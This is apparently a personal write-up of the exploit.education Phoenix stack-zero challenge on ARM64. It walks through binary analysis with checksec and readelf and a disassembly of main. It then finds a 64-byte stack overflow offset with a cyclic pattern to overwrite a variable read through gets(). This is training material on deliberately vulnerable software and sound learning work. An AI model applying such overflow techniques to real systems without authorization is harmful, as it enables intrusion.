# Stack-One (ARM)
So i previously did all the challenges from [exploit.education](https://exploit.education), so i decided to switch to the ARM64 and ARM32 version of these challenges.
## Analysing the Challenge
So before getting into exploitation it's always a good idea to analyze the binary that we're about to exploit.
```
$ checksec --file ./stack-zero
[*] '/opt/phoenix/arm64/stack-zero'
    Arch:     aarch64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
    RPATH:    b'/opt/phoenix/aarch64-linux-musl/lib'
	
$ file stack-zero
stack-zero: setuid, setgid ELF 64-bit LSB executable, ARM aarch64, version 1 (SYSV), dynamically linked, interpreter /opt/phoenix/aarch64-linux-musl/lib/ld-musl-aarch64.so.1, not stripped

$ readelf -h ./stack-zero
ELF Header:
  Magic:   7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00
  Class:                             ELF64
  Data:                              2's complement, little endian
  Version:                           1 (current)
  OS/ABI:                            UNIX - System V
  ABI Version:                       0
  Type:                              EXEC (Executable file)
  Machine:                           AArch64
  Version:                           0x1
  Entry point address:               0x400590
  Start of program headers:          64 (bytes into file)
  Start of section headers:          5296 (bytes into file)
  Flags:                             0x0
  Size of this header:               64 (bytes)
  Size of program headers:           56 (bytes)
  Number of program headers:         6
  Size of section headers:           64 (bytes)
  Number of section headers:         23
  Section header string table index: 20
  
$ readelf -p .shstrtab ./stack-zero
String dump of section '.shstrtab':
  [     1]  .symtab
  [     9]  .strtab
  [    11]  .shstrtab
  [    1b]  .interp
  [    23]  .hash
  [    29]  .dynsym
  [    31]  .dynstr
  [    39]  .rela.plt
  [    43]  .init
  [    49]  .text
  [    4f]  .fini
  [    55]  .rodata
  [    5d]  .eh_frame
  [    67]  .init_array
  [    73]  .fini_array
  [    7f]  .dynamic
  [    88]  .got
  [    8d]  .got.plt
  [    96]  .data
  [    9c]  .bss
  [    a1]  .comment

$ readelf -p .rodata ./stack-zero
String dump of section '.rodata':
  [     2]  @
  [     a]  @
  [    30]  Welcome to phoenix/stack-zero, brought to you by https://exploit.education
  [    80]  Well done, the 'changeme' variable has been changed!
  [    b8]  Uh oh, 'changeme' has not yet been changed. Would you like to try again?
```
#### Things we can notice on the analysis
Looking at the output of our small analysis there is a couple of things to note.
- Binary is an ARM64 (AArch64) binary for 64 bit architecture and was dynamically linked.
- All the protections are disabled for the program, the stack is writable, readable, and executable, which means we can write shellcode on the stack and the program will execute it.
- Entry point of the program is at `0x400590`.
- The program wants us to overwrite a variable on the stack.
- The file was linked with `/opt/phoenix/aarch64-linux-musl/lib/ld-musl-aarch64.so.1`.
## Approaching the Challenge
Now that we know basics stuff about, it's time to approach and win this challenge, let's disassemble the main function with gdb. Note that since the challenge is expecting us to overwrite something on the stack,  I know that the program will eventually make a comparison to check if a stack value is still the same, this comparison instruction can be found at `main+44`.
```x86asm
pwndbg> disass main
Dump of assembler code for function main:
   0x00000000004006c4 <+0>:     stp     x29, x30, [sp, #-112]!
   0x00000000004006c8 <+4>:     mov     x29, sp
   0x00000000004006cc <+8>:     str     w0, [x29, #28]
   0x00000000004006d0 <+12>:    str     x1, [x29, #16]
   0x00000000004006d4 <+16>:    adrp    x0, 0x400000
   0x00000000004006d8 <+20>:    add     x0, x0, #0x760
   0x00000000004006dc <+24>:    bl      0x400540 <puts@plt>
   0x00000000004006e0 <+28>:    str     wzr, [x29, #104]
   0x00000000004006e4 <+32>:    add     x0, x29, #0x28
   0x00000000004006e8 <+36>:    bl      0x400530 <gets@plt>
   0x00000000004006ec <+40>:    ldr     w0, [x29, #104]
   0x00000000004006f0 <+44>:    cmp     w0, #0x0
   0x00000000004006f4 <+48>:    b.eq    0x400708 <main+68>  // b.none
   0x00000000004006f8 <+52>:    adrp    x0, 0x400000
   0x00000000004006fc <+56>:    add     x0, x0, #0x7b0
   0x0000000000400700 <+60>:    bl      0x400540 <puts@plt>
   0x0000000000400704 <+64>:    b       0x400714 <main+80>
   0x0000000000400708 <+68>:    adrp    x0, 0x400000
   0x000000000040070c <+72>:    add     x0, x0, #0x7e8
   0x0000000000400710 <+76>:    bl      0x400540 <puts@plt>
   0x0000000000400714 <+80>:    mov     w0, #0x0                   // #0
   0x0000000000400718 <+84>:    bl      0x400560 <exit@plt>
End of assembler dump.
```
Before the comparison we see that the program move the value `[x29+104]` inside `w0`, then we check if this value on the stack has changed (different than 0).

So logically we can input a cyclic pattern to our program and check where exactly we overwrite the value on the stack.
```
pwndbg> b *main+44
pwndbg> r <<<$(cyclic 200)
pwndbg> x/s $w0
0x61616171:     <error: Cannot access memory at address 0x61616171>
pwndbg> cyclic -l 0x61616171
64
```
We can see that after 64 bytes of input we start overwriting the variable, this can be proved by inputting a 64 bytes cyclic pattern and a 65 bytes cyclic pattern and observing the outputs.
```
$ ./stack-zero <<<$(cyclic 64)
Welcome to phoenix/stack-zero, brought to you by https://exploit.education
Uh oh, 'changeme' has not yet been changed. Would you like to try again?

$ ./stack-zero <<<$(cyclic 65)
Welcome to phoenix/stack-zero, brought to you by https://exploit.education
Well done, the 'changeme' variable has been changed!
```
